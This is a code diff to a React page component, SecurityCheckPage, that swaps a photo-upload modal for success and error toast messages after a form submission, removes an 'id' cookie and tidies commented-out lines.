@@ -5,6 +5,7 @@ import { useState } from "react";
 import PhotoUpload from "../components/PhotoUpload";
 import { Field, Form, Formik } from "formik";
 import { API_URL } from "../config";
+import { toast } from "react-toastify";
 
 function SecurityCheckPage() {
   const [showModal, setShowModal] = useState(false);
@@ -36,19 +37,18 @@ function SecurityCheckPage() {
 
     if (res.ok) {
       console.log("success", data);
-      // toast.success("Login Succecssfull");
-      setShowModal(true);
+      toast.success("Login Succecssfull");
+      // setShowModal(true);
 
       formik.resetForm();
       console.log("success", data);
-      // toast.success("Login Succecssfull");
-      // Cookies.remove("id");
+      Cookies.remove("id");
       // Cookies.remove("email");
       // router.push("/account/email");
       // Cookies.remove("id");
     } else {
       console.log("error", data);
-      // toast.error("Something Went Wrong");
+      toast.error("Something Went Wrong");
     }
   };
 
@@ -100,7 +100,6 @@ function SecurityCheckPage() {
               <button
                 type="submit"
                 className="mt-[20px] bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
-                // className=" bg-custom-cyan hover:bg-custom-cyan2 px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
               >
                 Submit
               </button>
@@ -109,7 +108,7 @@ function SecurityCheckPage() {
         </Formik>
       </div>
 
-      {showModal && <PhotoUpload setShowModal={setShowModal} />}
+      {/* {showModal && <PhotoUpload setShowModal={setShowModal} />} */}
     </div>
   );
 }
